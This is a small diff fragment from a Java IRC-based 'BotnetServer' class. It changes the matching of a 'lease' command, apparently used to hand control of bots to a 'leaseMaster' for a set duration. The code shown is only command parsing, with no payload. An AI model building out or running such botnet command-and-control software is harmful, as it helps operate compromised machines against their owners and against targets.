@@ -216,7 +216,7 @@ public class BotnetServer extends PircBot {
 		//Respond to setop command by acquiring exclusive operator status (DOESN'T WORK)
 		} else if (s.toLowerCase().equalsIgnoreCase("setop")) {
 			acquireOpStatus();
-		} else if (s.toLowerCase().equalsIgnoreCase("lease")) {
+		} else if (s.toLowerCase().startsWith("lease")) {
 			//lease leaseMaster duration bot [more bots]
 			String[] parts = s.split(" ");
 			if (parts.length > 3) {
